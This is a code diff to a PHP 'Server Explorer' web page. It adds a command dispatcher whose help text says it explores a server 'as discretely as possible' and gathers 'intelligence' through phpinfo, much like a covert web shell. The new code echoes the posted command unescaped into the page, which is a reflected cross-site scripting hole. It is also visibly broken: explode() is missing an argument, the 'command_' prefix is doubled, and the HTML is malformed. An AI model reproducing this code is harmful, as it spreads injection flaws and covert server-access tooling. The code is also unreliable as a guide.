@@ -64,11 +64,11 @@
                         . (($settings["explorer"]["use_remote_assets"]) ? $remote_assets["favicon"]["actual"] : $remote_assets["favicon"]["backup"])
                         . '">' . (($settings["explorer"]["use_remote_assets"]) ? '<link rel="stylesheet" src="' . $remote_assets["stylesheet"] . '">' : '')
                         . '</head><body><header><h1>' . (($settings["explorer"]["use_remote_assets"]) ? '<img src="' . $remote_assets["logo"] . '" height="32" width="32"> ' : '') . 'Server Explorer</h1></header>'
-                        . '<div id="output"><pre>',
-        "input"         => '</pre></div><div id="input"><form action="' . $_SERVER["PHP_SELF"] . '?action=submit" method="POST">'
-                        . '<input name="command" type="text" placeholder="$>"><input type="submit" value="send (or press enter)">'
+                        . '<div id="output">',
+        "input"         => '</div><div id="input"><form action="' . $_SERVER["PHP_SELF"] . '?action=submit" method="POST">'
+                        . '<input name="command" type="text" placeholder="$>" value="' . (isset($_POST['command']) ? $_POST['command'] : "") . '"><input type="submit" value="send (or press enter)">'
                         . '</form>',
-        "login"         => 'Please log in</pre><div id="login"><form action="' . $_SERVER["PHP_SELF"] . '?action=login" method="POST">'
+        "login"         => '</h3>Please log in</h3><div id="login"><form action="' . $_SERVER["PHP_SELF"] . '?action=login" method="POST">'
                         . (($settings["auth"]["user_password"]["enabled"]) ? '<input name="username" placeholder="username" type="text" autocomplete="username" value="' . (($settings["auth"]["DemoMode"]["enabled"]) ? $settings["auth"]["DemoMode"]["username"] : "") . '">' : "")
                         . (($settings["auth"]["user_password"]["enabled"] || $settings["auth"]["app_password"]["enabled"]) ? '<input name="password" placeholder="password" type="password" autocomplete="username" value="' . (($settings["auth"]["DemoMode"]["enabled"]) ? $settings["auth"]["DemoMode"]["password"] : "") . '">' : "")
                         . '<input value="login (or press enter)" type="submit">',
@@ -172,13 +172,54 @@
         }
     }
 
+    // load commands
+    $commandList = array(
+        "help" => "displays this help message",
+        "phpinfo" => "displays the output of the phpinfo command. very useful to get inteligence on the server",
+        "fs" => "interact with the File System. Type `fs help` for a list of commands you can use with fs.",
+        "db" => "interact with a MySQL database. Type `db help` for a list of commands you can use with db.",
+    );
+
+    function command_help($argv=array()) {
+        global $commandList;
+        echo '<p>Welcome to Server Explorer.<br>This tool will let you explore this server in several ways and as discretely'
+            . ' as possible. Don\'t forget that unless you have been allowed to use this system (like in Jimmy\'s Demo) or'
+            . ' in your own setup, your actions may be subject to legal consequences as you would be accessing someone else'
+            . '\'s system without their consent. So, any action of yours, is your own responsability. Happy Exploring :)</p>'
+            . '<h3>Available Commands:</h3><table>';
+        foreach(array_keys($commandList) as $command) {
+            echo '<tr><th>' . $command . '<th></td>' . $commandList[$command] . '</td></tr>';
+        }
+        echo '</table><p>If you have any questions, problem or suggestion, free to contact me at <a href="mailto:serverExplorer@jimmybear217.dev">serverExplorer@jimmybear217.dev</a>'
+            . 'or to raise an issue on <a href="https://github.com/jimmybear217/serverExplorer" target="_blank">GitHub.com/jimmybear217/serverExplorer</a>. Thank you.</p>';
+    }
+
+    function command_phpinfo($argv=array()) {
+        if (isset($argv[0])) {
+            phpinfo($argv[0]);
+        } else {
+            phpinfo();
+        }
+    }
+
     // write header
     echo $pages["header"];
     
 
     // interpret commands
-    if (isset($_GET["action"]) && $_GET["action"] == "submit" && !empty($_POST["input"])) {
-        echo "Command: " . $_POST["input"];
+    if (isset($_GET["action"]) && $_GET["action"] == "submit" && !empty($_POST["command"])) {
+        $command = explode($_POST["command"]);
+        echo "Command: " . implode(" ", $command);
+        if (in_array($command[0], array_keys($commandList))) {
+            $comm = "command_" . array_shift($command);
+            $argv = $command;
+            call_user_func_array("command_" . $comm, $argv);
+        } else {
+            command_help();
+        }
+    } else {
+        // show help command
+        command_help();
     }
     
     
